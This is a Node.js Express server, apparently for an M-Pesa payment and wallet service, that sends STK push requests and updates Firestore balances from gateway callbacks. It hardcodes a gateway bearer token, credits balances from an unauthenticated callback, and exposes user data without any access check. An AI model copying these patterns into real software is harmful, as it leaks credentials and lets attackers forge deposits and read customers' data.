const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const PDFDocument = require("pdfkit");
const admin = require("firebase-admin");

const app = express();
const PORT = process.env.PORT || 3000;

admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
  }),
});
const db = admin.firestore();

const receiptsFile = path.join(__dirname, "receipts.json");

app.use(bodyParser.json());
app.use(
  cors({
    origin: "https://balancesystemfrontend.onrender.com",
  })
);

function readReceipts() {
  if (!fs.existsSync(receiptsFile)) return {};
  return JSON.parse(fs.readFileSync(receiptsFile));
}
function writeReceipts(data) {
  fs.writeFileSync(receiptsFile, JSON.stringify(data, null, 2));
}
function formatPhone(phone) {
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 9 && digits.startsWith("7")) return "254" + digits;
  if (digits.length === 10 && digits.startsWith("07")) return "254" + digits.substring(1);
  if (digits.length === 12 && digits.startsWith("254")) return digits;
  return null;
}

app.post("/pay", async (req, res) => {
  try {
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);
    if (!formattedPhone) return res.status(400).json({ success: false, error: "Invalid phone" });
    if (!amount || amount < 1) return res.status(400).json({ success: false, error: "Amount must be >= 1" });

    const reference = "ORDER-" + Date.now();
    const payload = {
      amount: Math.round(amount),
      phone_number: formattedPhone,
      external_reference: reference,
      customer_name: "Customer",
      callback_url: "https://balancesystembackend.onrender.com/callback",
      channel_id: "000205",
    };
    const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";

    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: `Bearer f7a932be3cd1251ab70bae129aacd9ae527287e927c5f45ec1cf4a3948eaf443`,
        "Content-Type": "application/json",
      },
    });

    if (resp.data.success) {
      const receiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        status: "pending",
        status_note: `STK push sent to ${formattedPhone}`,
        timestamp: new Date().toISOString(),
      };
      const receipts = readReceipts();
      receipts[reference] = receiptData;
      writeReceipts(receipts);

      res.json({ success: true, message: "STK push sent", reference, receipt: receiptData });
    } else {
      res.status(400).json({ success: false, error: "STK push failed" });
    }
  } catch (err) {
    console.error("Payment error:", err.message);
    res.status(500).json({ error: "Payment failed" });
  }
});

app.post("/callback", (req, res) => {
  const data = req.body;
  const ref = data.external_reference;
  let receipts = readReceipts();
  const existingReceipt = receipts[ref] || {};

  const status = data.status?.toLowerCase();
  const resultCode = data.result?.ResultCode;

  const customerName =
    data.result?.Name ||
    [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ") ||
    existingReceipt.customer_name ||
    "N/A";

  if ((status === "completed" && data.success === true) || resultCode === 0) {
    receipts[ref] = {
      ...existingReceipt,
      reference: ref,
      transaction_id: data.transaction_id,
      transaction_code: data.result?.MpesaReceiptNumber || null,
      amount: data.result?.Amount || existingReceipt.amount,
      loan_amount: existingReceipt.loan_amount || "50000",
      phone: data.result?.Phone || existingReceipt.phone,
      customer_name: customerName,
      status: "processing",
      status_note: `✅ Fee payment verified for ${customerName}.`,
      timestamp: new Date().toISOString(),
    };
  } else {
    let statusNote = data.result?.ResultDesc || "Payment failed or cancelled.";
    switch (data.result?.ResultCode) {
      case 1032:
        statusNote = "You cancelled the payment request.";
        break;
      case 1037:
        statusNote = "Timeout — no PIN entered.";
        break;
      case 2001:
        statusNote = "Insufficient balance.";
        break;
    }

    receipts[ref] = {
      reference: ref,
      transaction_id: data.transaction_id,
      transaction_code: null,
      amount: data.result?.Amount || existingReceipt.amount || null,
      phone: data.result?.Phone || existingReceipt.phone || null,
      customer_name: customerName,
      status: "cancelled",
      status_note: statusNote,
      timestamp: new Date().toISOString(),
    };
  }

  writeReceipts(receipts);
  res.json({ ResultCode: 0, ResultDesc: "Success" });
});

app.post("/deposit", async (req, res) => {
  try {
    const { userId, phone, amount } = req.body;
    
    if (!userId) {
      return res.status(400).json({ success: false, error: "User ID is required" });
    }
    
    const formattedPhone = formatPhone(phone);
    if (!formattedPhone) {
      return res.status(400).json({ success: false, error: "Invalid phone number format" });
    }
    
    if (!amount || amount < 1) {
      return res.status(400).json({ success: false, error: "Amount must be at least 1 KSH" });
    }

    const reference = "DEPOSIT-" + Date.now() + "-" + Math.random().toString(36).substring(7);
    const payload = {
      amount: Math.round(amount),
      phone_number: formattedPhone,
      external_reference: reference,
      customer_name: "Wallet Deposit",
      callback_url: "https://balancesystembackend.onrender.com/deposit-callback",
      channel_id: "000205",
    };

    console.log(`[DEPOSIT] Initiating deposit for user ${userId}, amount: ${amount}, phone: ${formattedPhone}, ref: ${reference}`);

    const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: `Bearer f7a932be3cd1251ab70bae129aacd9ae527287e927c5f45ec1cf4a3948eaf443`,
        "Content-Type": "application/json",
      },
      timeout: 30000,
    });

    console.log(`[DEPOSIT] SwiftWallet response:`, JSON.stringify(resp.data));

    if (!resp.data.success) {
      console.error(`[DEPOSIT] SwiftWallet API failed:`, resp.data);
      
      await db.collection("deposits").doc(reference).set({
        userId,
        phone: formattedPhone,
        amount: Math.round(amount),
        reference,
        status: "failed",
        note: resp.data.message || "STK push failed to initiate",
        error: resp.data.error || "Unknown error from payment gateway",
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        createdAt: new Date().toISOString(),
      });

      return res.status(400).json({
        success: false,
        error: resp.data.message || "Deposit failed to start",
        details: resp.data.error || "Payment gateway rejected the request",
      });
    }

    await db.collection("deposits").doc(reference).set({
      userId,
      phone: formattedPhone,
      amount: Math.round(amount),
      reference,
      transactionId: resp.data.transaction_id || null,
      status: "pending",
      note: "STK push sent. Check your phone.",
      timestamp: admin.firestore.FieldValue.serverTimestamp(),
      createdAt: new Date().toISOString(),
    });

    console.log(`[DEPOSIT] Successfully initiated. Transaction ID: ${resp.data.transaction_id}`);

    res.json({
      success: true,
      reference,
      transactionId: resp.data.transaction_id,
      message: "STK push sent. Check your phone.",
    });
  } catch (err) {
    console.error("[DEPOSIT] Error:", err.message);
    console.error("[DEPOSIT] Full error:", err);

    const errorDetails = err.response?.data || {};
    const reference = "DEPOSIT-ERROR-" + Date.now();

    try {
      await db.collection("deposits").doc(reference).set({
        userId: req.body.userId || "unknown",
        phone: req.body.phone || "unknown",
        amount: req.body.amount || 0,
        reference,
        status: "error",
        note: "Network error occurred",
        error: err.message,
        errorDetails: JSON.stringify(errorDetails),
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        createdAt: new Date().toISOString(),
      });
    } catch (dbErr) {
      console.error("[DEPOSIT] Failed to log error to database:", dbErr.message);
    }

    if (err.code === 'ECONNABORTED' || err.message.includes('timeout')) {
      return res.status(504).json({
        success: false,
        error: "Request timeout. Please try again.",
      });
    }

    if (err.response) {
      return res.status(err.response.status || 500).json({
        success: false,
        error: "Payment gateway error",
        details: errorDetails.message || err.message,
      });
    }

    res.status(500).json({
      success: false,
      error: "Network error. Please check your connection and try again.",
    });
  }
});

app.post("/deposit-callback", async (req, res) => {
  try {
    const data = req.body;
    console.log("[CALLBACK] Received deposit callback:", JSON.stringify(data));

    const ref = data.external_reference;
    if (!ref) {
      console.error("[CALLBACK] Missing external_reference in callback");
      return res.status(400).json({ error: "Missing reference" });
    }

    const resultCode = data.result?.ResultCode;
    const success = (data.status === "completed" && data.success === true) || resultCode === 0;

    let depositStatus = "failed";
    let note = "Deposit failed.";
    let mpesaReceiptNumber = null;

    if (success) {
      depositStatus = "success";
      note = "Deposit successful. Balance updated.";
      mpesaReceiptNumber = data.result?.MpesaReceiptNumber || null;
    } else if (resultCode === 1032) {
      depositStatus = "cancelled";
      note = "You cancelled the payment request.";
    } else if (resultCode === 1037) {
      depositStatus = "timeout";
      note = "Request timed out. No PIN entered.";
    } else if (resultCode === 2001) {
      depositStatus = "insufficient_balance";
      note = "Insufficient M-Pesa balance.";
    } else {
      note = data.result?.ResultDesc || "Deposit failed or cancelled.";
    }

    const depositRef = db.collection("deposits").doc(ref);
    const depositSnap = await depositRef.get();

    if (!depositSnap.exists) {
      console.error(`[CALLBACK] Deposit reference not found: ${ref}`);
      return res.status(404).json({ error: "Reference not found" });
    }

    const depositData = depositSnap.data();
    console.log(`[CALLBACK] Updating deposit ${ref} to status: ${depositStatus}`);

    await depositRef.update({
      status: depositStatus,
      note,
      mpesaReceiptNumber,
      resultCode,
      callbackData: data,
      updatedAt: admin.firestore.FieldValue.serverTimestamp(),
    });

    if (depositStatus === "success") {
      console.log(`[CALLBACK] Processing successful deposit for user: ${depositData.userId}`);
      
      const userRef = db.collection("users").doc(depositData.userId);
      const userSnap = await userRef.get();
      const currentBalance = userSnap.exists ? userSnap.data().balance || 0 : 0;
      const newBalance = currentBalance + depositData.amount;

      await userRef.set(
        {
          balance: newBalance,
          lastDeposit: depositData.amount,
          lastDepositDate: admin.firestore.FieldValue.serverTimestamp(),
          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
        },
        { merge: true }
      );

      console.log(`[CALLBACK] Balance updated: ${currentBalance} -> ${newBalance} for user ${depositData.userId}`);

      await db.collection("receipts").add({
        userId: depositData.userId,
        type: "deposit",
        reference: ref,
        amount: depositData.amount,
        phone: depositData.phone,
        mpesaReceiptNumber,
        status: "success",
        note,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        createdAt: new Date().toISOString(),
      });
    } else {
      await db.collection("receipts").add({
        userId: depositData.userId,
        type: "deposit",
        reference: ref,
        amount: depositData.amount,
        phone: depositData.phone,
        status: depositStatus,
        note,
        timestamp: admin.firestore.FieldValue.serverTimestamp(),
        createdAt: new Date().toISOString(),
      });
    }

    res.json({ ResultCode: 0, ResultDesc: "Deposit callback handled successfully" });
  } catch (err) {
    console.error("[CALLBACK] Error processing callback:", err.message);
    res.status(500).json({ error: "Callback processing failed" });
  }
});

app.get("/user/:userId", async (req, res) => {
  try {
    const { userId } = req.params;
    const userSnap = await db.collection("users").doc(userId).get();
    const balance = userSnap.exists ? userSnap.data().balance || 0 : 0;

    const depositsSnap = await db
      .collection("deposits")
      .where("userId", "==", userId)
      .orderBy("timestamp", "desc")
      .limit(50)
      .get();

    const transactions = depositsSnap.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        reference: data.reference,
        amount: data.amount,
        status: data.status,
        note: data.note,
        phone: data.phone,
        mpesaReceiptNumber: data.mpesaReceiptNumber || null,
        createdAt: data.createdAt,
        timestamp: data.timestamp,
      };
    });

    res.json({ balance, transactions });
  } catch (err) {
    console.error("Error fetching user data:", err.message);
    res.status(500).json({ error: "Failed to fetch user data" });
  }
});

app.get("/receipt/:reference", async (req, res) => {
  try {
    const { reference } = req.params;
    const depositSnap = await db.collection("deposits").doc(reference).get();

    if (!depositSnap.exists) {
      return res.status(404).json({ error: "Receipt not found" });
    }

    const data = depositSnap.data();
    res.json({
      reference: data.reference,
      amount: data.amount,
      phone: data.phone,
      status: data.status,
      note: data.note,
      mpesaReceiptNumber: data.mpesaReceiptNumber || null,
      transactionId: data.transactionId || null,
      createdAt: data.createdAt,
      timestamp: data.timestamp,
    });
  } catch (err) {
    console.error("Error fetching receipt:", err.message);
    res.status(500).json({ error: "Failed to fetch receipt" });
  }
});

app.get("/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString() });
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
